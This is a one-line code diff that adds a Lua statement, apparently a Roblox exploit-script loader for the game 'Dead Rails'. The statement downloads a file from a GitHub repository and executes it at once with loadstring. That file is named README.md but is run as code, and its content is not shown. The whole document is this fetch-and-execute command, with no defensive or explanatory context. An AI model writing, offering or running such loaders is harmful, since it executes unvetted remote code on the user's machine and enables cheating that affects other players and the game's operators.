@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Abbos013/Dead-Rails/refs/heads/main/README.md"))();
